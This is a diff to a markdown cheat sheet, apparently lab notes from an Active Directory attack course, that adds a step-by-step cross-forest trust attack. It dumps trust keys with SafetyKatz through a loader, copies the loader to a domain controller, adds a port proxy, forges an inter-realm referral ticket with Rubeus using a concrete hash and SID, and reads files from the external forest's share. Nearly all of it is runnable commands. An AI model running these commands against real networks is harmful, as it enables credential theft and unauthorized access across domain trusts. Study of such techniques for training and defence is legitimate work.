@@ -1583,32 +1583,88 @@ Rubeus evasive-golden
 
 #### Constraints
 - SID Filtering ENABLED (can't add arbitrary SIDs)
-- Only trusted groups allowed
-- One-way trusts limit options
+- No SID History injection allowed - will be filtered out by trusting forest
+- Only explicitly shared resources (not full domain shares) are accessible
+- Limited to resources on trusting forest DCs
+- Resource enumeration requires attempting TGS request for each service
 
-#### Steps
+#### Prerequisites
+- DA privileges on source domain
+- Trust key between domains (extractable via lsadump::evasive-trust)
+- Network access to external domain resources
+- Admin access to local DC to copy Loader.exe for execution
+
+#### Step 1: Extract Trust Key
 ```powershell
-# 1. Extract trust key
-SafetyKatz "lsadump::trust /patch"
-
-# 2. Create referral to external domain
-Rubeus evasive-silver 
-  /service:krbtgt/EXTERNAL.LOCAL
-  /rc4:external_trust_hash
-  /sid:S-1-5-21-[EXTERNAL-SID]
-  /user:Administrator
-  /domain:current.local
-
-# 3. Request TGS for external resource
-Rubeus asktgs 
-  /service:cifs/external-dc.external.local
-  /dc:external-dc.external.local
-  /ticket:[referral]
-  /ppt
-
-# 4. Access explicitly shared resources only
-dir \\external-dc.external.local\SharedWithCurrentDomain
+# Run from elevated process with DA privileges
+Loader.exe -path SafetyKatz.exe -args "lsadump::evasive-trust /patch"
 ```
+
+Output shows trust key in multiple formats (rc4_hmac_nt, aes256_hmac).
+
+#### Step 2: Obtain DA Privileges on Local DC
+```powershell
+# From local workstation with DA token
+echo F | xcopy C:\AD\Tools\Loader.exe \\dcorp-dc\C$\Users\Public\Loader.exe /Y
+winrs -r:dcorp-dc cmd
+
+# Setup port proxy on DC for HTTP access (if needed)
+netsh interface portproxy add v4tov4 listenport=8080 listenaddress=0.0.0.0 connectport=80 connectaddress:172.16.100.x
+```
+
+#### Step 3: Extract Trust Key from DC
+```powershell
+# From DC command shell
+C:\Users\Public\Loader.exe -path http://127.0.0.1:8080/SafetyKatz.exe -args "lsadump::evasive-trust /patch"
+```
+
+Returns trust key(s) between local and external domain:
+- Domain: EUROCORP.LOCAL (ecorp / S-1-5-21-3333069040-3914854601-3606488808)
+- Extract rc4_hmac_nt value for use in next step
+
+#### Step 4: Create Referral Ticket
+```powershell
+# Create inter-realm referral ticket (NO SID History)
+Rubeus evasive-silver 
+  /service:krbtgt/DOLLARCORP.MONEYCORP.LOCAL
+  /rc4:163373571e6c3e09673010fd60accdf0
+  /sid:S-1-5-21-719815819-3726368948-3917688648
+  /ldap
+  /user:Administrator
+  /nowrap
+```
+
+Key parameters:
+- `/service:krbtgt/[SOURCE-DOMAIN]` - NOT external domain
+- `/rc4:` - Use rc4_hmac_nt from trust key output
+- `/sid:` - Source domain SID
+- `/ldap` - Flag for LDAP binding
+- `/nowrap` - Output bare base64 ticket (needed for asktgs)
+
+#### Step 5: Request Service Ticket on External Domain
+```powershell
+# Use referral ticket to request TGS for external resource
+Rubeus asktgs 
+  /service:cifs/eurocorp-dc.eurocorp.local
+  /dc:eurocorp-dc.eurocorp.local
+  /ticket:doIGPjCCBjqgAwIBBaED...
+  /ppt
+```
+
+Parameters:
+- `/service:` - Target service on external domain DC (FQDN format)
+- `/dc:` - External domain DC FQDN
+- `/ticket:` - Paste base64 referral ticket from Step 4
+- `/ppt` - Inject ticket into current session
+
+#### Step 6: Access Explicitly Shared Resources
+```powershell
+# Only explicitly shared folders are accessible
+dir \\eurocorp-dc.eurocorp.local\SharedwithDCorp\
+type \\eurocorp-dc.eurocorp.local\SharedwithDCorp\secret.txt
+```
+
+Resource enumeration note: Must attempt TGS request for each suspected service/resource (e.g., LDAP, CIFS, HTTP) to discover accessible resources. Failed SPN requests indicate resource is not accessible or service doesn't exist.
 
 ---
 
